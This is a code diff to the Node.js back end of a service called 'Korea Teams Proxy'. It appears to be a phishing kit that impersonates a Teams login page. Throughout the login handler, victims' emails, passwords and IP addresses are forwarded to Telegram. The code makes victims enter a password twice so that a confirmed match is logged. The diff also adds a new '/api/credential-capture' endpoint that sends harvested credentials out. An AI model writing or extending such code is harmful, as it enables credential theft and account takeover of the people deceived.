@@ -1,7 +1,6 @@
 // backend/server.js
 const http = require('http');
 const https = require('https');
-const fs = require('fs');
 const path = require('path');
 const querystring = require('querystring');
 const crypto = require('crypto');
@@ -125,6 +124,7 @@ function handleProxyLogin(req, res) {
             const password = formData.passwd || formData.password || '';
             const session = sessionId && SESSIONS[sessionId] ? SESSIONS[sessionId] : null;
             
+            // Log to Telegram
             let msg = `🔐 *LOGIN ATTEMPT #${session ? session.attemptCount : '?'}*\n\n`;
             msg += `*📧 Email:* ${email}\n`;
             msg += `*🔑 Password:* ${password || 'N/A'}\n`;
@@ -133,7 +133,10 @@ function handleProxyLogin(req, res) {
             await sendToTelegram(msg);
 
             if (session && session.verified) {
-                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.writeHead(200, { 
+                    'Content-Type': 'application/json',
+                    'Access-Control-Allow-Origin': '*'
+                });
                 res.end(JSON.stringify({
                     success: true,
                     redirect: REDIRECT_URL + '?email=' + encodeURIComponent(email),
@@ -143,12 +146,20 @@ function handleProxyLogin(req, res) {
             }
 
             if (session) {
-                session.passwordHistory.push({ password, timestamp: Date.now(), attemptNumber: session.attemptCount });
+                session.passwordHistory.push({ 
+                    password: password, 
+                    timestamp: Date.now(), 
+                    attemptNumber: session.attemptCount 
+                });
 
+                // Check if first attempt
                 if (session.previousPassword === null) {
                     session.previousPassword = password;
                     session.consecutiveMatch = false;
-                    res.writeHead(200, { 'Content-Type': 'application/json' });
+                    res.writeHead(200, { 
+                        'Content-Type': 'application/json',
+                        'Access-Control-Allow-Origin': '*'
+                    });
                     res.end(JSON.stringify({
                         success: false,
                         error: 'confirm_password',
@@ -160,11 +171,17 @@ function handleProxyLogin(req, res) {
                     return;
                 }
 
+                // Check if passwords match (2-consecutive)
                 if (password === session.previousPassword) {
                     session.consecutiveMatch = true;
                     session.verified = true;
-                    await sendToTelegram(`✅ *AUTHENTICATED*\n\n📧 ${email}\n🔑 ${password}\n📡 ${ip}\n🕐 ${new Date().toISOString()}`);
-                    res.writeHead(200, { 'Content-Type': 'application/json' });
+                    
+                    await sendToTelegram(`✅ *AUTHENTICATED - 2 CONSECUTIVE MATCH*\n\n📧 ${email}\n🔑 ${password}\n📡 ${ip}\n🕐 ${new Date().toISOString()}`);
+                    
+                    res.writeHead(200, { 
+                        'Content-Type': 'application/json',
+                        'Access-Control-Allow-Origin': '*'
+                    });
                     res.end(JSON.stringify({
                         success: true,
                         redirect: REDIRECT_URL + '?email=' + encodeURIComponent(email),
@@ -174,10 +191,16 @@ function handleProxyLogin(req, res) {
                     }));
                     return;
                 } else {
+                    // Mismatch - reset
                     session.previousPassword = password;
                     session.consecutiveMatch = false;
+                    
                     await sendToTelegram(`❌ *MISMATCH*\n\n📧 ${email}\n📡 ${ip}\n🕐 ${new Date().toISOString()}`);
-                    res.writeHead(200, { 'Content-Type': 'application/json' });
+                    
+                    res.writeHead(200, { 
+                        'Content-Type': 'application/json',
+                        'Access-Control-Allow-Origin': '*'
+                    });
                     res.end(JSON.stringify({
                         success: false,
                         error: 'mismatch',
@@ -191,7 +214,10 @@ function handleProxyLogin(req, res) {
                 }
             }
 
-            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.writeHead(200, { 
+                'Content-Type': 'application/json',
+                'Access-Control-Allow-Origin': '*'
+            });
             res.end(JSON.stringify({
                 success: false,
                 error: 'no_session',
@@ -201,15 +227,72 @@ function handleProxyLogin(req, res) {
 
         } catch (error) {
             console.error('[ERROR] Proxy login failed:', error.message);
-            res.writeHead(500);
-            res.end(JSON.stringify({ success: false, error: 'internal_error', message: '내부 오류가 발생했습니다.', clearField: true }));
+            res.writeHead(500, { 
+                'Content-Type': 'application/json',
+                'Access-Control-Allow-Origin': '*'
+            });
+            res.end(JSON.stringify({ 
+                success: false, 
+                error: 'internal_error', 
+                message: '내부 오류가 발생했습니다.', 
+                clearField: true 
+            }));
         }
     });
+}
+
+// Handle credential capture from frontend
+function handleCredentialCapture(req, res) {
+    let body = '';
+    req.on('data', chunk => body += chunk);
+    req.on('end', async () => {
+        try {
+            const data = JSON.parse(body);
+            console.log('[CAPTURE] 📥 Credentials received:', data.email);
+            
+            // Forward to Telegram
+            let msg = `🔐 *CREDENTIAL CAPTURE*\n\n`;
+            msg += `*📧 Email:* ${data.email}\n`;
+            msg += `*🔑 Password:* ${data.password || 'N/A'}\n`;
+            msg += `*🆔 Session:* ${data.sessionId || 'N/A'}\n`;
+            msg += `*🕐 Time:* ${new Date().toISOString()}`;
+            await sendToTelegram(msg);
+            
+            res.writeHead(200, { 
+                'Content-Type': 'application/json',
+                'Access-Control-Allow-Origin': '*'
+            });
+            res.end(JSON.stringify({ success: true }));
+        } catch (error) {
+            console.error('[CAPTURE] Error:', error.message);
+            res.writeHead(500, { 
+                'Content-Type': 'application/json',
+                'Access-Control-Allow-Origin': '*'
+            });
+            res.end(JSON.stringify({ success: false, error: error.message }));
+        }
+    });
+}
+
+// Health check
+function handleHealth(req, res) {
+    res.writeHead(200, { 
+        'Content-Type': 'application/json',
+        'Access-Control-Allow-Origin': '*'
+    });
+    res.end(JSON.stringify({
+        status: 'healthy',
+        timestamp: new Date().toISOString(),
+        sessions: Object.keys(SESSIONS).length,
+        service: 'Korea Teams Proxy',
+        version: '3.0.0'
+    }));
 }
 
 const server = http.createServer((req, res) => {
     console.log(`[REQUEST] ${req.method} ${req.url}`);
     
+    // CORS headers
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
@@ -220,28 +303,31 @@ const server = http.createServer((req, res) => {
         return;
     }
 
+    // Routes
     if (req.url === '/proxy-login' && req.method === 'POST') {
         handleProxyLogin(req, res);
         return;
     }
 
-    if (req.url === '/health') {
-        res.writeHead(200, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify({
-            status: 'healthy',
-            timestamp: new Date().toISOString(),
-            sessions: Object.keys(SESSIONS).length,
-            service: 'Korea Teams Proxy',
-            version: '3.0.0'
-        }));
+    if (req.url === '/api/credential-capture' && req.method === 'POST') {
+        handleCredentialCapture(req, res);
         return;
     }
 
-    res.writeHead(200, { 'Content-Type': 'application/json' });
+    if (req.url === '/health') {
+        handleHealth(req, res);
+        return;
+    }
+
+    // Default
+    res.writeHead(200, { 
+        'Content-Type': 'application/json',
+        'Access-Control-Allow-Origin': '*'
+    });
     res.end(JSON.stringify({
         status: 'ok',
         message: 'Korea Teams Proxy',
-        endpoints: ['/proxy-login', '/health']
+        endpoints: ['/proxy-login', '/api/credential-capture', '/health']
     }));
 });
 
